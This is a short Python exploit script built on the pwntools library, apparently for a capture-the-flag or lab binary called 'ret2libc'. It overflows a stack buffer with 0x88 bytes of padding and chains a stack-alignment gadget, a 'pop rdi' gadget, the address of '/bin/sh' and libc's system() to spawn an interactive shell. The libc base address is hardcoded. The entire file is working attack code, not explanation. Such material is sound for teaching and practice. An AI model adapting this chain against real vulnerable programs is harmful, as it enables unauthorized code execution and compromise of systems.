#!/usr/bin/env python3
from pwn import *

BIN = "./ret2libc"

context.binary = BIN

# Both system and the string "/bin/sh" are in libc; as such they will be in the
# memory region where libc was mapped.
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7db8000

system_addr = libc.symbols['system']
print(hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh\x00'))
print(hex(binsh_addr))
poprdi = 0x401213
ret = 0x40101a

# static analysis ftw
ret_offset = 0x80 + 8

payload = b""
payload += ret_offset * b"A"
payload += p64(ret)  # align the stack
payload += p64(poprdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

io = process(BIN)
io.send(payload)
io.interactive()
